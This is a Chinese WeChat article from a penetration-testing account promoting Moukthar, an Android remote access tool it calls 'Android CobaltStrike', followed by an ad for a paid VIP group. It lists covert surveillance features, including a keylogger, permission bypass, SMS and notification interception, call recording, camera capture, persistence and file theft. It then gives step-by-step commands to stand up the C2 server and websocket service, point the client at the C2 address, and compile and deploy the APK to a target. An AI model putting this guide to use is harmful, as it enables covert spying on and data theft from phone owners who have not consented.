> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247492897&idx=1&sn=200f78d280c37069d42eb4e905bb1352

#  安卓版CobaltStrike：远程控制的终极利器|漏洞探测  
Tomiwa-Ot  渗透安全HackTwo   2025-07-01 16:00  
  
0x01 工具介绍  
  
  
**Moukthar作为一款强大的开源远程管理工具，以其权限绕过、键值记录、短信监听等硬核功能，成为安卓设备管理的“黑科技”利器。无论是安全研究还是设备管理，Moukthar都能提供高效、稳定的解决方案。本文将带你深入了解Moukthar的强大功能与安装步骤，助你快速上手，轻松掌控安卓设备的方方面面。这款堪称“安卓版CobaltStrike”的工具，解锁远程管理的无限可能！**  
  
**注意：**  
现在只对常读和星标的公众号才展示大图推送，建议大家把  
**渗透安全HackTwo**  
"**设为****星标⭐️**  
"  
**否****则可能就看不到了啦！**  
  
**下载地址在末尾#渗透安全HackTwo**  
  
0x02   
功能简介  
  
  
工具特点  
  
Android 远程管理工具  
  
- 权限绕过（Android 12 及以下）https://youtube.com/shorts/-w8H0lkFxb0  
- 键盘记录器https://youtube.com/shorts/Ll9dNrkjFOA  
- 通知监听器  
- 短信监听器  
- 电话录音  
- 图像捕捉和截图  
- 视频录制  
- 持久性  
- 读取和写入联系人  
- 列出已安装的应用程序  
- 下载和上传文件  
- 获取设备位置截图  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq565icRGqdbDPMMlptLujM6yqobwtWG0pBzy8icSBZ3VxC4CoQKMcZXbj7IAicAcTDUcm8mia9O8pVSfw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq565icRGqdbDPMMlptLujM6y3plPkvviaRMnqPNvezVnCQEduru3DMrUc7icQHVwDnnxMsgD3tfY5PGA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq565icRGqdbDPMMlptLujM6yx25wlNPRnCr75MibIVNcYN0pc4h1eHQt4dllVrdWRRPvUWiajqW0drfA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq565icRGqdbDPMMlptLujM6yKTF7ictGAZRX2GAWreg4SgIO9J4kS59BRDqozfGg1SvtccXDtMibicsjA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq565icRGqdbDPMMlptLujM6y8hlGmSlzlqlIu0QTah6icHnfib9VnKAxsJXpeIe4otW3cuSQwCEubYKg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq565icRGqdbDPMMlptLujM6ys9qRQpo4Toopviayib0ESJczqxjpFDg31iaNnJdw3vsgJVyBBup2Hwxgw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq565icRGqdbDPMMlptLujM6ywkoWEAibhrRPutq9llOuXticyqOB1vs5kcBOoicd1L5Eiajn5iazTVTvE9A/640?wx_fmt=png&from=appmsg "")  
###   
  
0x03更新说明  

```
仪表板上的自动滚动日志
屏幕截图不起作用
当应用程序未聚焦时，图像/视频捕获不起作用
使用 DownloadManager 在应用程序中下载文件不起作用
列出目录的组成部分并不列出所有文件/文件夹
```

  
0x04 使用介绍  
  
📦用法  
  
下载  
moukthar
```
moukthar.zip
```

  
  
安装 php、composer、mysql、php-mysql 驱动程序、apache2 和 a2enmod  
  
将服务器文件移动到/var/www/html/并安装依赖项  

```
mv moukthar/Server/* /var/www/html/
cd /var/www/html/c2-server
composer install
cd /var/www/html/web-socket/
composer install
cd /var/www
chown -R www-data:www-data .
chmod -R 777 .
```

  
默认凭据是用户名：android和密码：android  
  
创建新的 SQL 用户  

```
CREATE USER 'android'@'localhost' IDENTIFIED BY 'your-password';
GRANT ALL PRIVILEGES ON *.* TO 'android'@'localhost';
FLUSH PRIVILEGES;
```

  
c2-server/.env在和中设置数据库凭据web-socket/.env  
  
执行database.sql  
  
在 Linux 中启动 Web 套接字服务器或部署为服务  

```
php Server/web-socket/App.php
# OR
sudo mv Server/websocket.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable websocket.service
sudo systemctl start websocket.service
```

  
调整  
  
/etc/apache2/sites-available/000-default.conf  

```
<VirtualHost *:80>
      ServerAdmin webmaster@localhost
      DocumentRoot /var/www/html/c2-server
      DirectoryIndex app.php
      Options -Indexes
      ErrorLog ${APACHE_LOG_DIR}/error.log
      CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

  
调整/etc/apache2/apache2.conf  

```
  Comment this section
  #<Directory />
  #       Options FollowSymLinks
  #       AllowOverride None
  #       Require all denied
  #</Directory>
 Add this
  <Directory /var/www/html/c2-server>
      Options -Indexes
      DirectoryIndex app.php
      AllowOverride All
      Require all granted
  </Directory>
```

  
增加 php 文件上传最大大小  
  
/etc/php/*.*/apache2/php.ini  

```
; Increase size to permit large file uploads from client
upload_max_filesize = 128M
; Set post_max_size to upload_max_filesize + 1
post_max_size = 129M
```

  
c2-server/src/View/home.php在 <script>标签中设置 Web 套接字服务器地址c2-server/src/View/features/files.php  

```
const ws = new WebSocket('ws://IP_ADDRESS:8080');
```

  
使用以下命令重新启动 apache  

```
sudo a2enmod rewrite && sudo service apache2 restart
```

  
在客户端设置C2服务器和Web套接字服务器地址functionality/Utils.java  

```
public static final String C2_SERVER = &#34;http://localhost&#34;;
public static final String WEB_SOCKET_SERVER = &#34;ws://localhost:8080&#34;;
```

  
使用 Android Studio 编译 APK 并部署到目标  
  
视频教程  

```
https://www.youtube.com/watch?v=ykOx19hAaD4
```

  
  
  
**0x05 内部VIP星球介绍-V1.4（福利）**  
  
        如果你想学习更多**渗透测试技术/应急溯源/免杀/挖洞赚取漏洞赏金/红队打点**  
欢迎加入我们**内部星球**  
可获得内部工具字典和享受内部资源和  
内部交流群，**每1-2天更新1day/0day漏洞刷分上分****(2025POC更新至4000+)**  
**，**  
包含网上一些**付费****工具及BurpSuite自动化漏****洞探测插件，AI代审工具等等**  
。shadon\Quake\  
Fofa高级会员，CTFShow等各种账号会员共享。详情直接点击下方链接进入了解，觉得价格高的师傅可后台回复"   
**星球**  
 "有优惠券名额有限先到先得！全网资源  
最新  
最丰富！**（🤙截止目前已有1900+多位师傅选择加入❗️早加入早享受）**  
  
****  
  
**👉****点击了解加入-->>内部VIP知识星球福利介绍V1.4版本-1day/0day漏洞库及内部资源更新**  
  
****  
  
  
结尾  
  
# 免责声明  
  
  
# 获取方法  
  
  
**公众号回复20250702获取下载**  
  
# 最后必看-免责声明  
  
  
      
文章中的案例或工具仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，勿用于非法行为。如  
用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用。  
如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。本工具或文章或来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！  
  
  
  
# 往期推荐  
  
  
**1.内部VIP知识星球福利介绍V1.4（AI自动化工具）**  
  
**2.CS4.8-CobaltStrike4.8汉化+插件版**  
  
**3.最新BurpSuite2025.2.1专业版（新增AI模块）**  
  
**4. 最新xray1.9.11高级版下载Windows/Linux**  
  
**5. 最新HCL AppScan Standard**  
  
  
渗透安全HackTwo  
  
微信号：关注公众号获取  
  
后台回复星球加入：  
知识星球  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq6qFFAxdkV2tgPPqL76yNTw38UJ9vr5QJQE48ff1I4Gichw7adAcHQx8ePBPmwvouAhs4ArJFVdKkw/640?wx_fmt=png "二维码")  
  
  
  
[全面资产收集流程及方法解析 万字长文窥探信息收集|挖洞技巧](https://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247491574&idx=1&sn=48d865c82a228bd135a035419c765e94&scene=21#wechat_redirect)  
  
  
